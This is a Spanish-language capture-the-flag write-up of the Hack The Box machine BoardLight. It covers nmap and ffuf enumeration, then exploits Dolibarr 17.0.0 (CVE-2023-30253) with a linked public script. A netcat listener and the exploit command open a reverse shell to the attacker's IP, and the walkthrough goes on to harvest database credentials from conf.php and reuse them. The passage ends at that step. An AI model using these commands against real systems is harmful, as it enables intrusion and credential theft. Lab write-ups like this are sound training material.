<h1>Enumeración</h1>
comenzamos la enumeracion de la máquina victima ejecutando un ping a la IP objetivo 10.10.11.11 para comprobar que la máquina está activa:
![Captura de pantalla 2024-06-26 a las 11 15 41](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9d4b7303-ca0f-4a1e-9f72-f86a23caea0e)

Como podemos observar, la máquina está activa ya que nos devuelve el ping y, por el ttl=63, podemos intuir que estamos ante una máquina linux.

Vamos ahora a realizar un escaneo sencillo con nmap para ver que puertos están abiertos y que servicios corren en ellos: 

sudo nmap -p- -sV -sS --min-rate 5000 -n 10.10.11.11 -oN scan.txt

![Captura de pantalla 2024-06-26 a las 11 18 46](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e3c448fb-1c9d-4ca8-b66f-7a5373852a0d)

Podemos ver que los puertos 22 (ssh) y 80 (http) estan abiertos y corriendo un servidor OpenSSH y un servidor web Apache respectivamente, por lo que vamos a intentar
acceder al servidor de apache a través del navegador: 

![Captura de pantalla 2024-06-26 a las 11 20 53](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/0f393783-6013-45c9-9e85-b03800732a86)

Como podemos ver el servidor resuelve rápido la petición a través de la Ip y llegamos a esta págima de destino, vamos a echar un vistazo a ver si vemos algo interesante...

Al tratarse de un sitio web hecho en PHP, podemos intentar explotar algún tipo de LFI empleando algún wraper de PHP desde la propia URL del sitio, en concreto, 
si enviamos un formulario vacío que podemos encontrar en el pie de página, vemos que se realiza una petición (10.10.11.11/index.php?), vamos a ver si podemos explotarlo:

Como podemos ver en la petición del formulario, no se envía ningún tipo de dato y simplemente nos recargar la misma página de contacto:

![Captura de pantalla 2024-06-26 a las 11 31 30](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/a3d5eb64-457f-428d-be39-8eb23d05f860)

Puesto que no podremos explotar un LFI ni un potencial SSRF, vamos a seguir con el proceso de enumeración haciendo fuzzing para encontrar directorios o subdominios potencialmente
vulnerables. Un dato  interesante es que encontramos un correo de contacto en el pie de página de la web que nos sugiere que existe un dominio board.htb
![Captura de pantalla 2024-06-26 a las 11 39 43](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e7b003d9-e67c-40d4-8d33-19698f4402eb)

Así que podemos añadir este dominio a nuestro etc/hosts ya que si lo probamos en el navegador nos dirige al mismo servidor web.
![Captura de pantalla 2024-06-26 a las 11 41 51](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/11714c8e-07da-4d02-a67f-3eb37fabba9c)

Ahora, vamos con el fuzzing. Usaremos la herramienta ffuf y un diccionario de SecList para ver que encontramos:

sudo ffuf -u http://FUZZ.board.htb -t 200 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

Este comando con ffuf, nos encuentra el subdominio crm, por lo que existe crm.board.htb, vamos a añadirlo al etc/hosts y a acceder a el a ver que contiene:
![Captura de pantalla 2024-06-26 a las 14 14 48](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/18bc9fb8-748e-4183-82f4-0734f35eb6d8)
![Captura de pantalla 2024-06-26 a las 14 15 12](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/d69fa083-1a2a-417c-84f0-0ac22077311b)

En este subdomino, podemos acceder a una página de inicio de sesión del conocido gestor de relaciones con los clientes, Dollibar, en su versión 17.0.0

![Captura de pantalla 2024-06-26 a las 14 27 14](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/3b79efd3-dd75-45d2-b338-33ed3b440877)


Si buscamos algo de información en Google acerca de este software y dicha versión, podemos ver que existe una vulnerabilidad asociada que nos permite explotar 
ejecución remota de comandos (RCE) y otorgarnos una shell reversa. La vulnerabilidad está reportada como la CVE-2023-30253 y el repositorio de github encontrado para 
esta vulnerabilidad, que contiene un script en python, es el siguiente: https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

De este modo, vamos a descargarnos y a ejecuar el script en python para otorgarnos una shell reversa del siguiente modo:

Con -> nc -lvnp 9001 nos ponemos en escucha por el puerto 9001
Con -> python3 exploit.py http://crm.board.htb admin admin 10.10.14.28 9001 (Nos la enviamos a nuestra propia Ip)

![Captura de pantalla 2024-06-26 a las 14 31 42](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/2c3a47f3-58b0-4fa2-b995-993ec3ad8055)
![Captura de pantalla 2024-06-26 a las 14 31 54](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9892eec0-9b0e-4451-a8f0-0a0cb4f1e665)

Si dentro de la máquina victima, retrocedemos un par de directorios hacia atrás en busca de algo interesante, podemos detenernos en la ruta /htbdocs y si
listamos el contenido con ls -la, podemos encontrar un fichero conf que puede resultar interesante para este tipo de servidores (conf.php) ya que suele 
contener usuarios y credenciales de alguna base de datos que se esté usando.

![Captura de pantalla 2024-06-26 a las 14 37 45](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/72d83f29-d067-4ec4-8e2d-c65de7956112)

![Captura de pantalla 2024-06-26 a las 14 39 38](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/c5118307-7d72-42ac-a226-935d1a332bce)

Y efectivamente, dentro de config.php enontramos credenciales de acceso para una base de datos mysql.

Si intentamos acceder a la base de datos mysql, el sistema nos indica que no tenemos permiso de acceso como usuario www-data por lo que tendremos que encontrar 
otra vía de acceso. 
![Captura de pantalla 2024-06-26 a las 14 44 24](https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/fad76804-5738-4fb6-a192-d1f51ec81984)

Retrocediendo hasta el directorio /home, encontramos el directorio de un usuario a nivel de sistema llamado larissa, así que podemos probar a iniciar sesión
con este usuario y con la credencial obtenida en conf.php mediante el script anterior de python.



